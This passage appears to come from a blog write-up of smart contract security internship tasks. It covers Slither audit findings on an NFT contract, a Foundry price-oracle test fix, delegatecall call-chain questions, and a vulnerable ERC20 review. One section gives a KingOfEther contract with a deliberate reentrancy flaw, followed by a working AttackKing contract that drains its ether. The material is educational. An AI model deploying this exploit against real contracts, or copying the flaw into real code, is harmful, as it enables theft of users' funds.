+</span></code></pre></ul><li><p><strong>[LOW] Nft.royaltyInfo(uint256,uint256).royalties (src/NFT/NFT.sol#356) shadows</strong></p> <ul><li>This is a variable shadowing vulnerability<li><code>royalties</code> variable in <code>AbstractRoyalties</code> in line 85 is being shadowed by the <code>royalties</code> variable at line 356.</ul><li><p><strong>[LOW] Nft.updateUtilityAddress(address)._address (src/NFT/NFT.sol#278) lacks a zero-check on</strong></p> <ul><li>Lack of zero address check of <code>_address</code> in <code>updateUtilityAddress()</code> function.</ul><li><p><strong>[LOW] Nft.updateGovernanceAddress(address)._address (src/NFT/NFT.sol#284) lacks a zero-check on</strong></p> <ul><li>Lack of zero address check of <code>_address</code> in <code>updateGovernanceAddress()</code> function.</ul><li><p><strong>[LOW] Nft.setOwner(address)._owner (src/NFT/NFT.sol#316) lacks a zero-check on</strong></p> <ul><li>Zero address check has to be done when updating new <code>owner</code> in <code>setOwner()</code> function.</ul><li><p><strong>[LOW] Nft.updateRoyaltyAddress(address)._address (src/NFT/NFT.sol#363) lacks a zero-check on</strong></p> <ul><li>No zero address check of new royalty address in <code>updateRoyaltyAddress</code>.</ul><li><p><strong>[LOW] Reentrancy in Nft.safeMint(address) (src/NFT/NFT.sol#181-187)</strong></p> <ul><li><p>Again slither marking this as a reentrancy, because the sate variable updation was done after the external call.</p><li><p>Update the function as follows</p> <pre style=color:#323232;background-color:#fff><code><span>function safeMint(address _to) public whenNotPaused onlyRole(CLEVEL) {
+</span><span>    uint256 tokenId = _tokenIdCounter.current();
+</span><span>    _tokenIdCounter.increment();
+</span><span>    items.push(Item(block.timestamp, 0, 0, 0, false));
+</span><span>    _safeMint(_to, tokenId);
+</span><span>    emit AdminMinted(msg.sender, _to, tokenId);
+</span><span>}
+</span></code></pre></ul><li><p><strong>[LOW] Nft.summon(address,uint256) (src/NFT/NFT.sol#189-220) uses timestamp for comparisons.</strong></p> <ul><li>The usage of <code>block.timestamp</code> for deadline check can be exploited by the malicious validators.<li>This offers no protection as <code>block.timestamp</code> will have the value of whichever block the txn is inserted into, hence the txn can be held indefinitely by malicious validators.</ul></ol><h1 id=foundry-task>Foundry Task</h1><h2 id=description-4>Description</h2><p>The PriceGetter contract is designed to fetch the price conversion rate from DAI to USDC using Uniswap V3's price oracle. Contract have dai and usdc token addresses on arbitrum and Time Weighted Average Price (TWAP) as 1800. The <code>daiToUsdc()</code> function calculates and returns the amount of USDC equivalent to a given amount of DAI.<p>To install dependencies :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>    $ forge install uniswap/v3-core --no-commit
+</span><span>    $ forge install uniswap/v3-periphery --no-commit
+</span></code></pre><h2 id=initial-test-results>Initial Test Results :</h2><pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>mj0ln1r@Linux:~/internship-tasks/Foundry task$ forge test -vv --fork-url https://rpc.ankr.com/arbitrum 
+</span><span>[⠑] Compiling...
+</span><span>No files changed, compilation skipped
+</span><span>
+</span><span>Running 1 test for test/PriceGetter.t.sol:PriceGetterTest
+</span><span>[FAIL. Reason: assertion failed] test_DaiToWant() (gas: 88731)
+</span><span>Logs:
+</span><span>  Error: a </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span> b not satisfied </span><span style=color:#a71d5d;font-weight:700>[</span><span>uint</span><span style=color:#a71d5d;font-weight:700>]
+</span><span>    Value a: 1000497454863863263864864160056
+</span><span>    Value b: 1100000
+</span><span>
+</span><span>Test result: FAILED. 0 passed</span><span style=color:#a71d5d;font-weight:700>; </span><span>1 failed</span><span style=color:#a71d5d;font-weight:700>; </span><span>0 skipped</span><span style=color:#a71d5d;font-weight:700>; </span><span>finished in 14.88s
+</span><span> 
+</span><span>Ran 1 test suites: 0 tests passed, 1 failed, 0 skipped (1 total tests)
+</span><span>
+</span><span>Failing tests:
+</span><span>Encountered 1 failing test in test/PriceGetter.t.sol:PriceGetterTest
+</span><span>[FAIL. Reason: assertion failed] test_DaiToWant() (gas: 88731)
+</span><span>
+</span><span>Encountered a total of 1 failing tests, 0 tests succeeded
+</span></code></pre><h2 id=reason-of-test-fail>Reason of test fail</h2><p>The price range of the DAI/USDC pool is always lies between 0.9 to 1.1. This is because DAI and USDC are both stablecoins, which are designed to maintain a value close to 1 USD. The range of 0.9 to 1.1 is chosen to accommodate minor fluctuations in the price of these stablecoins. If the price of DAI/USDC falls outside this range, LPs may choose to remove their liquidity to avoid potential losses.<ul><li><p>The <code>assertGt(price, 9 * 10 ** (usdcDecimals - 1))</code> and <code>assertLt(price, 11 * 10 ** (usdcDecimals - 1))</code> lines are assertions to verify that the fetched price is within the expected range.</p><li><p>That is the fetched prize should be between, <code>900000</code> and <code>1100000</code>.</p><li><p>The price we result is in high precision. We can round the price in terms of <code>usdc</code> by dividing the price with <code>10**(usdcDecimals + daiDecimals)</code></p> <pre style=color:#323232;background-color:#fff><code><span>function test_DaiToWant() public {
+</span><span>  uint256 price= priceGetter.daiToUsdc(10 ** daiDecimals);
+</span><span>  price = price/ 10**(usdcDecimals + daiDecimals);
+</span><span>  assertGt(price, 9 * 10 ** (usdcDecimals - 1));  // price > 0.9$
+</span><span>  assertLt(price, 11 * 10 ** (usdcDecimals - 1));  // price &lt; 1.1$
+</span><span>}
+</span></code></pre><li><p>We can also calculate the <code>price</code> by the formula <strong><code>1.0001 ** tick</code></strong></p><li><p>Then the result can be divided by <code>10**6</code> to get the price in <code>USDC</code>.</p><li><p>The above updated test will pass and it ensures the price of usdc is between 0.9 to 1.1.</p></ul><pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>mj0ln1r@AHLinux:~/internship-tasks/Foundry task$ forge test -vv --fork-url https://rpc.ankr.com/arbitrum
+</span><span>[⠑] Compiling...
+</span><span>No files changed, compilation skipped
+</span><span>
+</span><span>Running 1 test for test/PriceGetter.t.sol:PriceGetterTest
+</span><span>[PASS] test_DaiToWant() (gas: 23487)
+</span><span>Test result: ok. 1 passed</span><span style=color:#a71d5d;font-weight:700>; </span><span>0 failed</span><span style=color:#a71d5d;font-weight:700>; </span><span>0 skipped</span><span style=color:#a71d5d;font-weight:700>; </span><span>finished in 3.27s
+</span><span> 
+</span><span>Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
+</span></code></pre><h1 id=delegatecall>Delegatecall</h1><h2 id=description-5>Description</h2><p>The DelegateCall.sol consists of four contract <code>Manager</code>, <code>MetaHub</code>, <code>Vault</code> and <code>Controller</code>. Two interfaces which are used to interact with <code>MetaHub</code> and <code>Controller</code>. One <code>Assets</code> library is defined. These contracts makes a complex calls and delegatecalls.<h2 id=questions-1>Questions</h2><ol start=0><li><p>Which contract is the entry point?</p> <ul><li>The entry point of this contract chain is the <code>Manager</code> contract.<li>The <code>deposit()</code> function in the <code>Manager</code> contract is the starting point for this contract interaction. When a user calls the deposit function with a specific tokenId, it triggers a call to the deposit function in the <code>Metahub</code> contract and the chain continues.</ul><li><p>Where in the code is the <code>onERC721Received</code> function from Vault called? You need to write out the call chain.Where in the code is the <code>onERC721Received</code> function from Vault called? You need to write out the call chain.</p> <ul><li>The <code>onERC721Received</code> functionis defined inside <code>Vault</code> contract, but it was not called directly.<li>When we call <code>deposit()</code> function in <code>Manager</code> with a tokenId, it will call the <code>deposit()</code> function of the <code>MetaHub</code> contract.<li>The <code>MetaHub</code> contract now calls the <code>transferAssetToVault()</code> function on <code>Assets</code> library.<li>Then the <code>Assets</code> library will make a <code>delegatecall</code> to the <code>transferAssetToVault()</code> on the <code>Controller</code> contract.<li>The <code>Controller</code> contract will call the internal <code>_transferAsset()</code> function.<li>The <code>_transferAsset()</code> function will now calls the <code>transferFrom()</code> function of <code>ERC721</code> contract with the <code>to</code> value as the <code>Vault</code> address.<li>Finally, when the asset sent to the <code>Vault</code> the <code>onERC721Received()</code> will be invoked.<li><strong>NOTE</strong>: In openzeppelin ERC721 contract the <code>onERC721Received()</code> onlycalled if we sent asset using <code>safeTransferFrom()</code>.<li>Tx chain : Manager -> MetaHub -> Assets -> Controller -> ERC721 -> Vault.onERC721Received().</ul><li><p>What are <code>address(this)</code> and <code>msg.sender</code> equal to when Controller.transferAssetToVault is called?</p> <ul><li>The <code>address(this)</code> will be the <code>MetaHub</code> and <code>msg.sender</code> will be <code>Metahub</code>.<li><code>Controller.transferAssetToVault()</code> is called by the <code>Assets</code> library through <code>delegatecall</code>. i.e, <code>msg.sender</code>, <code>address(this)</code> will be maintained from the <code>Assets</code>.<li><code>Assets.transferAssetToVault()</code> is called by the <code>MetHub.deposit()</code> with <code>delegatecall</code> because the call is to a library.<li>So, the <code>msg.sender</code> and <code>address(this)</code> at <code>Assets.transferAssetToVault()</code> same as values at <code>Controller.transferAssetToVault()</code>.</ul><li><p>Will <code>require</code> of modifier <code>whenAssetDepositAllowed</code> (Vault contract) be reverted or not? Why?</p> <ul><li><p>The <code>require</code> will <strong>not</strong> reverted, because the <code>operator</code> is the <code>_metahub</code> address.</p><li><p><code>operator</code> is the <code>msg.sender</code> inside the ERC721 contract.</p> <pre style=color:#323232;background-color:#fff><code><span>try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) 
+</span></code></pre><li><p><code>_msgSender()</code> is the operator that passed to <code>onERC721Received()</code>.</p><li><p><code>msg.sender</code> in ERC721 is the <code>Metahub</code> contract address. Because the Metahub delegatecalls Controller function which calls the ERC721 contract.</p></ul><li><p>Will modifier <code>onlyDelegatecall</code> from Controller contract correctly work out? Why?</p> <ul><li><p><code>onlyDelegatecall</code> modifier is working properly.</p> <pre style=color:#323232;background-color:#fff><code><span>modifier onlyDelegatecall() {
+</span><span>    if (address(this) == __self) revert FunctionMustBeCalledThroughDelegatecall();
+</span><span>    _;
+</span><span>}
+</span></code></pre><li><p><code>address(this)</code> when a delegatecall was made from <code>Assets</code> library will be the <code>address(this)</code> inside the <code>Assets</code>.</p><li><p>So, the <code>address(this)</code> at <code>onlyDelegatecall</code> modifier will be the address of <code>MetaHub</code>.</p><li><p>If the <code>address(this)</code> is same as the <code>__self</code> that means no delegatecall was made. So, the modifier will revert.</p></ul><li><p>How many contracts are being deployed? Which ones?</p> <ul><li>Manager, Vault, Controller, MetaHub and already deployed Token contract.</ul></ol><h1 id=king-of-the-ether>King of the Ether</h1><h2 id=description-6>Description</h2><p>The KingOfEther contract is implemented in the way that it is mentioned. Every user is able to send ether to the contracts unti the game is on. The one who stakes most will be the king and he will get 1 ether extra as a reward. And every users will be able to withdraw funds once the game is over.<p><strong>KingsOfEther</strong><pre style=color:#323232;background-color:#fff><code><span>```
+</span><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.20;
+</span><span>
+</span><span>contract KingOfEther{
+</span><span>    address public owner;
+</span><span>    address public king;
+</span><span>    bool public isGameOver;
+</span><span>    uint public startingTime;
+</span><span>    mapping (address => uint) public stakes;
+</span><span>
+</span><span>    event King(address, uint);
+</span><span>
+</span><span>    constructor() payable {
+</span><span>        require(msg.value == 1 ether, "Send 1 ether on deployment");
+</span><span>        startingTime = block.timestamp;
+</span><span>        owner = msg.sender;
+</span><span>        isGameOver = false;
+</span><span>    }
+</span><span>
+</span><span>    function depositStake() public payable {
+</span><span>        require(msg.value > 0, "0 Amount not valid");
+</span><span>        require(!isGameOver, "Game ended");
+</span><span>
+</span><span>        stakes[msg.sender] += msg.value;
+</span><span>
+</span><span>        if(stakes[msg.sender] > stakes[king]){
+</span><span>            king = msg.sender;
+</span><span>            emit King(king, stakes[king]);
+</span><span>        }
+</span><span>    }
+</span><span>
+</span><span>    function endGame() public {
+</span><span>        require(block.timestamp > startingTime + 30, "Can't end now");
+</span><span>        require(!isGameOver, "Alredy ended");
+</span><span>
+</span><span>        stakes[king] += 1 ether;
+</span><span>        isGameOver = true;
+</span><span>    }
+</span><span>
+</span><span>    function withdraw() public {
+</span><span>        require(isGameOver, "Game not ended");
+</span><span>        require(stakes[msg.sender] > 0, "You have no stakes");
+</span><span>
+</span><span>        (bool success, ) = msg.sender.call{value: stakes[msg.sender]}("");
+</span><span>        require(success, "Withdraw Failed");
+</span><span>        stakes[msg.sender] = 0;
+</span><span>    }
+</span><span>
+</span><span>}
+</span><span>```
+</span></code></pre><ul><li><p>The <code>withdraw()</code> function is vulnerable to Reentrancy as it makes external call before updating the stake value.</p><li><p>The <code>AttackKing</code> contract will exploit the KingOfEther and drains all the ether.</p> <pre style=color:#323232;background-color:#fff><code><span>contract AttackKing{
+</span><span>    KingOfEther public kingContract;
+</span><span>    constructor(address _kingContract) {
+</span><span>        kingContract = KingOfEther(_kingContract);
+</span><span>    }
+</span><span>    function deposit() public payable  {
+</span><span>        kingContract.depositStake{value: 1 ether}();
+</span><span>    }
+</span><span>    function exploit() public {
+</span><span>        require(block.timestamp > kingContract.startingTime()+30, "Wait to exploit");
+</span><span>        if(!kingContract.isGameOver()){
+</span><span>            kingContract.endGame();
+</span><span>        }
+</span><span>        kingContract.withdraw();
+</span><span>    }
+</span><span>
+</span><span>    receive() external payable {  
+</span><span>        if(address(kingContract).balance >= 1 ether){
+</span><span>            kingContract.withdraw();
+</span><span>        }
+</span><span>    }
+</span><span>}
+</span></code></pre><li><p>Call <code>deposit()</code> first then call <code>exploit()</code> to attack the <code>KingOfEther</code>.</p></ul><h1 id=vulnerable-erc20>Vulnerable ERC20</h1><h2 id=description-7>Description</h2><p>ERC20 is a fungible token standard came from EIP20. ERC20 Tokens are widely used fungible tokens in ethereum. The ERC20 token must implement the necessary functions mentioned in the EIP20 proposal.<h2 id=observations-2>Observations</h2><ul><li>The ERC20.sol file consists of a <code>SafeMath</code> library and a <code>ERC20</code> contract.<li><code>ERC20</code> contract uses SafeMath library on the uint256 instances.<li>It has basic state variables name, total_supply, symbol, decimals which are required for a ERC20 token.<li>It uses two mappings <code>_balances</code> and <code>allowances</code> to keep track balances of user and allowances of a user.<li><code>balanceOf()</code> function returns the token balance of an address and <code>allowance()</code> returns approval amount of tokens by the owner to the spender.<li><code>transfer()</code> function transfers the tokens between addresses. And emits <code>Transfer</code> event on transfer.<li><code>approve()</code> function approves a spender to spend owner tokens. Emits <code>Approve</code> event on approval.<li><code>transferFrom()</code> used to transfer the tokens on behalf of the token owner by the spender.</ul><h2 id=differences-from-standard-erc20>Differences from Standard ERC20</h2><ol><li>Vulnerable ERC20 enables custom decimal places, while many ERC20 tokens follows the standard 18 decimals.<li>Owner will get the the <code>totalSupply</code> of token balance after deploying the token.<li><code>approve()</code> function not checking the <code>to</code> address. (Missing zero address check).<li><code>transfer()</code> function is not following the standard ERC20 pattern.<li>Transferring tokens from one address to other address will transfer <code>6%</code> of tokens to the <code>owner</code>.<li>The <code>Transfer</code> event only emits with the actual <code>from</code> and <code>to</code> and <code>amount</code>.<li><code>Transfer</code> event not emitted with the fee tokens sent to the <code>owner</code>.<li>Also emitted token amount is the amount that user wants to send. Not the actual amount that being sent (minus comission).<li><code>TransferFrom()</code> function not checking for the allowed allowances, this not result in any token loss but overflow will occur if the amount passed to the TransferFrom is greater than the actual allowance<li>All the functions are <code>public</code> by default in standard ERC20.</ol><h2 id=vulnerabilities-recommendations>Vulnerabilities & Recommendations</h2><ol><li><code>approve()</code> allows the spender account using a given number of tokens by updating the value of allowance.<li>Suppose the spender account is able to control miners' confirming order of transferring, then spender could use up all allowance before approve comes into effect.<li>After approve() is effective, spender has access to the new allowance, causing total tokens spent greater than expected and resulting in Re-approve attack.<li>Using <code>increaseApprove()</code> and <code>decreaseApprove()</code> functions are the recommendatios for it.<li>Recommended to declare state variables private and use implement public functions to read them.<li>Its recommended to inherit OpenZeppelin ERC20 contract to use.</ol><hr><p>Thank you !</section></article></main></div>
